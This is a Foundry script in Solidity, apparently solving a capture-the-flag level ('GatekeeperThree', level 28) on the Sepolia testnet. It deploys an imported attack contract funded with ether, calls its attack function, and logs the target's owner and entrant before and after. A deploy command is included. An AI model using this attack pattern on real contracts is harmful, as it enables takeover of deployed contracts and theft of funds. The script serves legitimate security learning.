// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {GatekeeperAttack, GatekeeperThree} from "../src/level28.sol";

contract Level28Script is Script {
    function run(address instanceAddress) external {
        GatekeeperThree target = GatekeeperThree(payable(instanceAddress));

        address ownerBefore = target.owner();
        address entrantBefore = target.entrant();
        bool allowEntranceBefore = target.allowEntrance();
        console.log("Owner before:", ownerBefore);
        console.log("Entrant before:", entrantBefore);
        console.log("Allow entrance before:", allowEntranceBefore);

        vm.startBroadcast();
        GatekeeperAttack attackContract = new GatekeeperAttack{
            value: 0.002 ether
        }(payable(instanceAddress));
        attackContract.attack();
        vm.stopBroadcast();

        address ownerAfter = target.owner();
        address entrantAfter = target.entrant();
        bool allowEntranceAfter = target.allowEntrance();
        console.log("Owner after:", ownerAfter);
        console.log("Entrant after:", entrantAfter);
        console.log("Allow entrance after:", allowEntranceAfter);
        console.log("Attack successful:", entrantAfter != address(0));
    }
}
//forge script script/level28.s.sol:Level28Script --rpc-url $SEPOLIA_RPC_URL --broadcast --account yourkey --sig "run(address)" your instance address
